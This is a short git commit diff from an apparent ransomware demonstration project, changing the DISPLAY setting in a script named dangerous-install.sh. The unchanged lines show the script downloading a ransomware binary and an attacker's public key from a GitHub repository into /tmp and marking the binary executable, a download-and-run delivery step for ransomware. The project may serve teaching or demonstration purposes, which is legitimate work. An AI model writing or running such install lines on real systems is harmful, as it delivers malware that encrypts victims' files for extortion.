42f49f5140e3b66a5cad1b136aa0b306627c2286
soonann <sudo@soonann.dev>
2024-03-18 11:25:03 +0800

    WIP: build

--- ransomware/scripts/dangerous-install.sh
+++ ransomware/scripts/dangerous-install.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-export DISPLAY=:0
+export DISPLAY=:1.0
 wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/dist/ransomware -O /tmp/ransomware
 wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/attacker/public_key.pem -O /tmp/public_key.pem
 chmod +x /tmp/ransomware
